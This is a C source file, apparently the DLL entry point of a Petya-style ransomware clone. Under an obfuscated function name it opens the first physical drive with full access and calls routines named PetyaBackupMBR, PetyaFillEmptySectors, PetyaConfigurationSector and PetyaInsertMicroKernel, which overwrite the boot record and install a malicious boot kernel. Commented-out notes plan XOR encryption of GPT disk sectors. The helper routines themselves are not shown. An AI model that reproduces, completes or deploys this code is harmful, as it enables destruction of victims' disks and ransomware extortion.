#include <Windows.h>
#include "misc.h"

#pragma section(".text", execute, read, write)
#pragma code_seg(".text")




HANDLE hHard = NULL;

BOOL APIENTRY
ZuWQdweafdsg345312(
	HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	




	hHard = CreateFileW( L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
									FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0 );


	if ( hHard == INVALID_HANDLE_VALUE )
		MessageBox( 0, GetLastError( ), "Fatal Error - CF", 0 ); //Fatal error

	/*BYTE* bBuffer = (BYTE*)VirtualAlloc( 0, 1024,
										  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );


	BOOL bDevice = DeviceIoControl( hHard,
		IOCTL_DISK_GET_DRIVE_LAYOUT_EX,
		NULL,
		0,
		bBuffer,
		1024,
		NULL, NULL );

	DRIVE_LAYOUT_INFORMATION_EX* DiskInformation = ( DRIVE_LAYOUT_INFORMATION_EX* )bBuffer;*/

	//if ( DiskInformation->PartitionStyle == PARTITION_STYLE_GPT );
		/*
		  - Get GPT Header Address
		  - Encrypt the sector with 0x37 Xoring
		  - Write the Encrypted Sector to Sector 56 (I Guess)
		*/
	/*else
		PetyaBackupMBR( );
	VirtualFree( bBuffer, 1024, MEM_FREE );*/




	PetyaBackupMBR( );
	PetyaFillEmptySectors( );
	PetyaConfigurationSector( );
	PetyaInsertMicroKernel( );


	CloseHandle( hHard );
	return 0;
}